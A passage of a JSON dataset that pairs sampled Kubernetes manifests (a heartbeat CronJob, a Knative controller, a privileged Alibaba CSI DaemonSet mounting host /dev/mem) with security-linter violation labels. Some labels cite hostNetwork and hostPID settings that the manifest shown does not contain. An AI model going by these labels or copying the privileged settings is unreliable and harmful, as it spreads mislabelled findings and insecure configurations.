    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana\" is not set to runAsNonRoot"
  },
  {
    "id": "8751",
    "manifest_path": "data/manifests/the_stack_sample/sample_3298.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          botkube.io/disable: 'true'\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          imagePullPolicy: IfNotPresent\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\nif [ -z \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            \\ ]; then\\n  printf \\\"%s - Yikes - Missing UPTIMEROBOT_HEARTBEAT_URL environment\\\n            \\ variable\\\" \\\"$(date -u)\\\"\\n  exit 0\\nfi\\nstatus_code=$(curl --connect-timeout\\\n            \\ 10 --max-time 30 -I -s -o /dev/null -w '%{http_code}' \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            )\\nif [ \\\"${status_code}\\\" != \\\"200\\\" ]; then\\n  printf \\\"%s - Yikes -\\\n            \\ Heartbeat request failed, http code: %s\\\" \\\"$(date -u)\\\" \\\"$status_code\\\"\\\n            \\n  exit 0\\nfi\\nprintf \\\"%s - Success - Heartbeat request received and\\\n            \\ processed successfully\\\" \\\"$(date -u)\\\"\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"uptimerobot-heartbeat\" does not have a read-only root file system"
  },
  {
    "id": "8752",
    "manifest_path": "data/manifests/the_stack_sample/sample_3298.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          botkube.io/disable: 'true'\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          imagePullPolicy: IfNotPresent\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\nif [ -z \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            \\ ]; then\\n  printf \\\"%s - Yikes - Missing UPTIMEROBOT_HEARTBEAT_URL environment\\\n            \\ variable\\\" \\\"$(date -u)\\\"\\n  exit 0\\nfi\\nstatus_code=$(curl --connect-timeout\\\n            \\ 10 --max-time 30 -I -s -o /dev/null -w '%{http_code}' \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            )\\nif [ \\\"${status_code}\\\" != \\\"200\\\" ]; then\\n  printf \\\"%s - Yikes -\\\n            \\ Heartbeat request failed, http code: %s\\\" \\\"$(date -u)\\\" \\\"$status_code\\\"\\\n            \\n  exit 0\\nfi\\nprintf \\\"%s - Success - Heartbeat request received and\\\n            \\ processed successfully\\\" \\\"$(date -u)\\\"\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"uptimerobot-heartbeat\" is not set to runAsNonRoot"
  },
  {
    "id": "8753",
    "manifest_path": "data/manifests/the_stack_sample/sample_3298.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          botkube.io/disable: 'true'\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          imagePullPolicy: IfNotPresent\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\nif [ -z \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            \\ ]; then\\n  printf \\\"%s - Yikes - Missing UPTIMEROBOT_HEARTBEAT_URL environment\\\n            \\ variable\\\" \\\"$(date -u)\\\"\\n  exit 0\\nfi\\nstatus_code=$(curl --connect-timeout\\\n            \\ 10 --max-time 30 -I -s -o /dev/null -w '%{http_code}' \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            )\\nif [ \\\"${status_code}\\\" != \\\"200\\\" ]; then\\n  printf \\\"%s - Yikes -\\\n            \\ Heartbeat request failed, http code: %s\\\" \\\"$(date -u)\\\" \\\"$status_code\\\"\\\n            \\n  exit 0\\nfi\\nprintf \\\"%s - Success - Heartbeat request received and\\\n            \\ processed successfully\\\" \\\"$(date -u)\\\"\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"uptimerobot-heartbeat\" has cpu request 0"
  },
  {
    "id": "8754",
    "manifest_path": "data/manifests/the_stack_sample/sample_3298.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          botkube.io/disable: 'true'\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          imagePullPolicy: IfNotPresent\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\nif [ -z \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            \\ ]; then\\n  printf \\\"%s - Yikes - Missing UPTIMEROBOT_HEARTBEAT_URL environment\\\n            \\ variable\\\" \\\"$(date -u)\\\"\\n  exit 0\\nfi\\nstatus_code=$(curl --connect-timeout\\\n            \\ 10 --max-time 30 -I -s -o /dev/null -w '%{http_code}' \\\"$UPTIMEROBOT_HEARTBEAT_URL\\\"\\\n            )\\nif [ \\\"${status_code}\\\" != \\\"200\\\" ]; then\\n  printf \\\"%s - Yikes -\\\n            \\ Heartbeat request failed, http code: %s\\\" \\\"$(date -u)\\\" \\\"$status_code\\\"\\\n            \\n  exit 0\\nfi\\nprintf \\\"%s - Success - Heartbeat request received and\\\n            \\ processed successfully\\\" \\\"$(date -u)\\\"\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"uptimerobot-heartbeat\" has memory limit 0"
  },
  {
    "id": "8755",
    "manifest_path": "data/manifests/the_stack_sample/sample_3299.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: github.com/knative/serving/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config-logging\n          mountPath: /etc/config-logging\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: config-logging\n        configMap:\n          name: config-logging\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"controller\" is using an invalid container image, \"github.com/knative/serving/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8756",
    "manifest_path": "data/manifests/the_stack_sample/sample_3299.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: github.com/knative/serving/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config-logging\n          mountPath: /etc/config-logging\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: config-logging\n        configMap:\n          name: config-logging\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "8757",
    "manifest_path": "data/manifests/the_stack_sample/sample_3299.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: github.com/knative/serving/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config-logging\n          mountPath: /etc/config-logging\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: config-logging\n        configMap:\n          name: config-logging\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "8758",
    "manifest_path": "data/manifests/the_stack_sample/sample_3299.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: github.com/knative/serving/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config-logging\n          mountPath: /etc/config-logging\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: config-logging\n        configMap:\n          name: config-logging\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "8759",
    "manifest_path": "data/manifests/the_stack_sample/sample_3300.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: carrental-v1\n  labels:\n    app: carrental-v1\nspec:\n  ports:\n  - name: 9102-tcp\n    protocol: TCP\n    port: 9102\n    targetPort: 9102\n  selector:\n    app: carrental-v1\n    deploymentconfig: carrental-v1\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:carrental-v1 deploymentconfig:carrental-v1])"
  },
  {
    "id": "8760",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"csi-plugin\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "8761",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8762",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "8763",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-plugin\" is using an invalid container image, \"csi-plugin\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8764",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"csi-plugin\" does not expose port 11260 for the HTTPGet"
  },
  {
    "id": "8765",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
